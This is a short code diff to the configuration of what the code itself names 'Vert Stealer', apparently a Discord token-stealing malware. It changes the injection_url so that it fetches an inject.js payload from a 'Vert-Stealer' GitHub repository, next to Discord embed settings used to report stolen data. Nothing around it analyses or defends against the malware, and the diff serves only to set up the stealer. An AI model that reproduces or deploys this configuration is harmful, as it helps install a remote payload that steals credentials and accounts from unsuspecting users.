@@ -14,7 +14,7 @@ const config = {
   embed_name: 'VERT', 
   embed_icon: 'https://cdn.discordapp.com/attachments/961950134814535700/961987421879287878/IMG_9854.png'.replace(/ /g, '%20'), 
   embed_color: 8363488,
-  injection_url: 'https://raw.githubusercontent.com/TWIST-X7/Injection/main/Injection-clean.js', 
+  injection_url: 'https://raw.githubusercontent.com/VertX00D/Vert-Stealer/main/Injection/inject.js', 
   /**
    * BY VERT STEALER.
    **/
